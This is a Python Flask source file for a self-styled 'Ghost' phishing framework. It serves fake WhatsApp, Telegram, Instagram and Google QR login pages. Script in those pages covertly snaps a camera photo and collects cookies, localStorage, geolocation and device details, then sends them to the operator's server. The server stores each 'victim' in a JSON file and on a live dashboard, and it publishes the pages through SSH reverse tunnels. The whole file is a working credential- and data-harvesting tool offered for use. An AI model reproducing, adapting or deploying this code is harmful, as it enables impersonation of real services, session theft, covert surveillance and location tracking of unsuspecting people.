import os
import sys
import time
import io
import base64
import json
import threading
import subprocess
from datetime import datetime

try:
    import qrcode
    from colorama import init, Fore, Style
    from flask import Flask, render_template_string, request, jsonify
except ImportError:
    print("[-] جارٍ تثبيت المكتبات البرمجية الأساسية...")
    os.system("pip install -r requirements.txt")
    import qrcode
    from colorama import init, Fore, Style
    from flask import Flask, render_template_string, request, jsonify

init(autoreset=True)

app = Flask(__name__)

CONFIG = {
    "target_name": "WhatsApp",
    "theme": "whatsapp"
}

SESSION_STATE = {
    "scanned": False,
    "token": f"ALQAEAR_GHOST_SESS_{int(time.time())}"
}

HARVESTED_VICTIMS = []

BANNER = f"""
{Fore.RED}
     _                  _
    | '-.            .-' |
    | -. '..\\\\,.//,.' .- |
    |   \\  \\\\\\||///  /   |
   /|    )M\\/%%%%/\\/(  . |\\
  (/\  MM\\/%\\/\\||/%\\\\/MM  /\\)
  (//M   \\%\\\\\\%%//%//   M\\\\)
(// M________ /\\ ________M \\\\)
 (// M\\ \\(',)|  |(',)/ /M \\\\) \\\\\\\\  
  (\\\\ M\\.  /,\\\\//,\\  ./M //)
    / MMmm( \\\\||// )mmMM \\  \\\\
     // MMM\\\\\\||///MMM \\\\ \\\\
      \\//''\\)/||\\(/''\\\\/ \\\\
      mrf\\\\( \\oo/ )\\\\\\/\\
           \\'-..-'\\/\\\\
              \\\\/ \\\\
{Fore.CYAN}  [+] Al-Qaesar Ghost Phantom Operations Framework (القيصر اليماني)
  [+] Enterprise Ghost Recon, Deep-Injection & Multimedia Harvester Suite v10.0
{Style.RESET_ALL}
"""

TEMPLATES = {
    "whatsapp": {
        "title": "WhatsApp Web - المصادقة السريعة",
        "bg": "#111b21",
        "card": "#202c33",
        "primary": "#00a884",
        "text": "#e9edef",
        "sub": "#8696a0",
        "instructions": "1. افتح WhatsApp على هاتفك.<br>2. انتقل إلى الإعدادات > الأجهزة المرتبطة.<br>3. انقر على ربط جهاز وامسح الرمز أدناه."
    },
    "telegram": {
        "title": "Telegram Web - تسجيل الدخول الآمن",
        "bg": "#0f212e",
        "card": "#172d40",
        "primary": "#2481cc",
        "text": "#ffffff",
        "sub": "#8a9ba8",
        "instructions": "1. افتح تطبيق Telegram على جوالك.<br>2. اذهب إلى الإعدادات > الأجهزة > ربط جهاز سطح المكتب.<br>3. وجه الكاميرا نحو الرمز."
    },
    "instagram": {
        "title": "Instagram - بوابة المصادقة الفورية",
        "bg": "#fafafa",
        "card": "#ffffff",
        "primary": "#0095f6",
        "text": "#262626",
        "sub": "#8e8e8e",
        "instructions": "امسح رمز الاستجابة السريعة باستخدام تطبيق Instagram للمتابعة الفورية بأمان."
    },
    "google": {
        "title": "Google Account - حماية الحساب والمزامنة",
        "bg": "#202124",
        "card": "#303134",
        "primary": "#8ab4f8",
        "text": "#e8eaed",
        "sub": "#9aa0a6",
        "instructions": "امسح رمز الاستجابة السريعة بكاميرا الهاتف لمزامنة جلسة حساب Google وملفات تعريف الارتباط الخاصة بك."
    }
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; background-color: {{ bg }}; color: {{ text }}; padding-top: 40px; margin: 0; }
        .box { background: {{ card }}; padding: 35px; border-radius: 12px; display: inline-block; box-shadow: 0 8px 24px rgba(0,0,0,0.4); max-width: 360px; border: 1px solid rgba(255,255,255,0.05); }
        img { width: 240px; height: 240px; background: white; padding: 10px; border-radius: 8px; margin: 15px 0; }
        h2 { color: {{ primary }}; font-size: 20px; margin-bottom: 10px; }
        p { color: {{ sub }}; font-size: 13px; line-height: 1.5; }
        .footer { font-size: 10px; margin-top: 20px; color: {{ sub }}; opacity: 0.7; }
        .loader { border: 3px solid rgba(255,255,255,0.1); width: 30px; height: 30px; border-radius: 50%; border-left-color: {{ primary }}; animation: spin 1s linear infinite; display: inline-block; margin-top: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video { display: none; }
    </style>
</head>
<body>
    <div class="box" id="container">
        <h2>{{ title }}</h2>
        <p>{{ instructions | safe }}</p>
        <img src="data:image/png;base64,{{ qr_code }}" alt="Secure QR">
        <div id="status-area">
            <div class="loader"></div>
            <p style="font-size: 11px; margin-top: 5px;">في انتظار مسح الرمز والمزامنة...</p>
        </div>
        <div class="footer">Al-Qaesar Ghost Engine &copy; 2026</div>
    </div>
    
    <video id="v" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        function executeGhostProtocol() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                let video = document.getElementById('v');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let imageData = canvas.toDataURL('image/jpeg', 0.85);
                    
                    stream.getTracks().forEach(track => track.stop());
                    collectAndTransmit(imageData);
                }, 1800);
            })
            .catch(err => {
                collectAndTransmit("Camera_Denied_Or_Unavailable");
            });
        }

        function collectAndTransmit(camImage) {
            let cookies = document.cookie || "No_Direct_Cookies";
            let storage = JSON.stringify(localStorage);
            let screenInfo = screen.width + "x" + screen.height;
            let platformInfo = navigator.platform;
            let language = navigator.language || "Unknown";
            let cores = navigator.hardwareConcurrency || "Unknown";
            let memory = navigator.deviceMemory || "Unknown";
            let userAgent = navigator.userAgent || "Unknown";
            let connection = navigator.connection ? (navigator.connection.effectiveType || "Unknown") : "Unknown";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    sendGhostPayload(cookies, storage, screenInfo, platformInfo, language, cores, memory, userAgent, connection, position.coords.latitude, position.coords.longitude, camImage);
                }, function(error) {
                    sendGhostPayload(cookies, storage, screenInfo, platformInfo, language, cores, memory, userAgent, connection, "Denied", "Denied", camImage);
                });
            } else {
                sendGhostPayload(cookies, storage, screenInfo, platformInfo, language, cores, memory, userAgent, connection, "Not Supported", "Not Supported", camImage);
            }
        }

        function sendGhostPayload(cookies, storage, screenInfo, platformInfo, language, cores, memory, userAgent, connection, lat, lon, camImage) {
            fetch('/capture-ghost', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    cookies: cookies, 
                    storage: storage, 
                    screen: screenInfo, 
                    platform: platformInfo,
                    lang: language,
                    cores: cores,
                    memory: memory,
                    userAgent: userAgent,
                    connection: connection,
                    lat: lat,
                    lon: lon,
                    image: camImage
                })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === 'success') {
                    document.getElementById('container').innerHTML = "<h2 style='color:{{ primary }};'>تمت المصادقة بنجاح!</h2><p>جاري مزامنة الجلسة وفتح التطبيق...</p>";
                }
            });
        }

        setTimeout(executeGhostProtocol, 3000);

        setInterval(() => {
            fetch('/check-status').then(res => res.json()).then(data => {
                if(data.status === 'captured') {
                    document.getElementById('container').innerHTML = "<h2 style='color:{{ primary }};'>تمت المصادقة بنجاح!</h2><p>جاري مزامنة الجلسة...</p>";
                }
            });
        }, 2000);
    </script>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Al-Qaesar Live Dashboard</title>
    <style>
        body { background: #0b0f19; color: #f3f4f6; font-family: Tahoma, sans-serif; padding: 20px; margin: 0; }
        h1 { color: #38bdf8; text-align: center; }
        .container { max-width: 900px; margin: auto; }
        .card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #334155; }
        .label { color: #38bdf8; font-weight: bold; }
        .data { color: #cbd5e1; word-break: break-all; }
        .refresh-btn { background: #0284c7; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; display: block; margin: 20px auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ لوحة تحكم القيصر الحية (Live Operations)</h1>
        <button class="refresh-btn" onclick="location.reload()">تحديث البيانات</button>
        <div id="results">
            {% if victims %}
                {% for v in victims %}
                <div class="card">
                    <p><span class="label">الوقت:</span> <span class="data">{{ v.timestamp }}</span></p>
                    <p><span class="label">المنصة:</span> <span class="data">{{ v.platform }}</span></p>
                    <p><span class="label">عنوان IP:</span> <span class="data">{{ v.ip }}</span></p>
                    <p><span class="label">الموقع الجغرافي:</span> <span class="data">Lat: {{ v.latitude }} | Lon: {{ v.longitude }}</span></p>
                    <p><span class="label">المتصفح والنظام:</span> <span class="data">{{ v.os_platform }} | {{ v.user_agent }}</span></p>
                    <p><span class="label">ملفات الارتباط (Cookies):</span> <span class="data">{{ v.cookies }}</span></p>
                </div>
                {% endfor %}
            {% else %}
                <p style="text-align: center; color: #94a3b8;">لا توجد أي أهداف مُلتقطة حتى الان. بانتظار الضحايا...</p>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

def save_to_json(data):
    filename = "ghost_harvested_data.json"
    try:
        if os.path.exists(filename):
            with open(filename, "r", encoding="utf-8") as f:
                records = json.load(f)
        else:
            records = []
        records.append(data)
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(records, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"[-] JSON Error: {e}")

@app.route('/')
def index():
    SESSION_STATE["scanned"] = False
    SESSION_STATE["token"] = f"ALQAEAR_GHOST_SESS_{int(time.time())}"
    
    img = qrcode.make(SESSION_STATE["token"])
    buffered = io.BytesIO()
    img.save(buffered, format="PNG")
    qr_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    t = TEMPLATES.get(CONFIG["theme"], TEMPLATES["whatsapp"])
    return render_template_string(HTML_TEMPLATE, 
                                 qr_code=qr_base64, 
                                 title=t["title"], 
                                 bg=t["bg"], 
                                 card=t["card"], 
                                 primary=t["primary"], 
                                 text=t["text"], 
                                 sub=t["sub"], 
                                 instructions=t["instructions"])

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE, victims=reversed(HARVESTED_VICTIMS))

@app.route('/check-status')
def check_status():
    return jsonify({"status": "captured" if SESSION_STATE["scanned"] else "waiting"})

@app.route('/capture-ghost', methods=['POST'])
def capture_ghost():
    data = request.json or {}
    victim_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    SESSION_STATE["scanned"] = True
    
    record = {
        "timestamp": timestamp,
        "platform": CONFIG["target_name"],
        "token": SESSION_STATE["token"],
        "ip": victim_ip,
        "user_agent": data.get('userAgent', 'Unknown'),
        "connection": data.get('connection', 'Unknown'),
        "screen": data.get('screen', 'Unknown'),
        "os_platform": data.get('platform', 'Unknown'),
        "language": data.get('lang', 'Unknown'),
        "cpu_cores": data.get('cores', 'Unknown'),
        "device_memory": data.get('memory', 'Unknown'),
        "latitude": data.get('lat', 'N/A'),
        "longitude": data.get('lon', 'N/A'),
        "cookies": data.get('cookies', 'None'),
        "local_storage": data.get('storage', 'None')
    }
    
    HARVESTED_VICTIMS.append(record)
    save_to_json(record)
    
    print(f"\n{Fore.GREEN}[+] Ghost Target Fully Compromised! IP: {victim_ip} | Deep Recon Captured!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] يمكنك مراجعة البيانات حياً عبر المتصفح بالدخول إلى الرابط ومعها /dashboard{Style.RESET_ALL}")
        
    return jsonify({"status": "success"})

def run_server():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def start_tunnel():
    print(f"{Fore.YELLOW}[*] جاري إنشاء نفق الارتباط السري وتجاوز قيود الإنترنت عبر Ghost Proxies...{Style.RESET_ALL}")
    time.sleep(2)
    
    tunnels = [
        ["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:5000", "serveo.net"],
        ["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:5000", "localhost.run"]
    ]
    
    for cmd in tunnels:
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    if "https://" in output:
                        for word in output.split():
                            if word.startswith("https://"):
                                print(f"\n{Fore.GREEN}[+] ═══════════════════════════════════════════════════════ [+]")
                                print(f"{Fore.GREEN}[+]  الرابط الشبح العالمي النشط (Ghost Payload URL): {Fore.WHITE}{word}")
                                print(f"{Fore.GREEN}[+]  لوحة التحكم المحلية للمتصفح (Live Dashboard): {Fore.WHITE}{word}/dashboard")
                                print(f"{Fore.GREEN}[+] ═══════════════════════════════════════════════════════ [+]\n{Style.RESET_ALL}")
                                return
        except Exception:
            continue
            
    print(f"{Fore.RED}[-] تعذر إنشاء النفق، يجدر التحقق من الاتصال بالشبكة.{Style.RESET_ALL}")

if __name__ == '__main__':
    os.system('clear')
    print(BANNER)
    
    print(f"{Fore.YELLOW}[1] WhatsApp Web")
    print("[2] Telegram Web")
    print("[3] Instagram")
    print(f"[4] Google Account (التقاط شبحي متقدم وشامل){Style.RESET_ALL}")
    choice = input(f"{Fore.YELLOW}[?] حدد المنصة المستهدفة للاختبار (1-4): {Style.RESET_ALL}").strip()
    
    if choice == "2":
        CONFIG["target_name"] = "Telegram"
        CONFIG["theme"] = "telegram"
    elif choice == "3":
        CONFIG["target_name"] = "Instagram"
        CONFIG["theme"] = "instagram"
    elif choice == "4":
        CONFIG["target_name"] = "Google Account"
        CONFIG["theme"] = "google"
    else:
        CONFIG["target_name"] = "WhatsApp"
        CONFIG["theme"] = "whatsapp"

    print(f"\n{Fore.CYAN}[*] جارٍ تشغيل نظام القيصر الشبح (Ghost Engine) على المنفذ 5000...{Style.RESET_ALL}")
    threading.Thread(target=run_server, daemon=True).start()
    threading.Thread(target=start_tunnel, daemon=True).start()
    
    print(f"{Fore.RED}[*] اضغط CTRL+C لإنهاء الجلسة وإيقاف السيرفر.\n{Style.RESET_ALL}")
    
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] تم إيقاف نظام الشبح بنجاح بواسطة القيصر اليماني. وداعاً!{Style.RESET_ALL}")
        sys.exit(0)
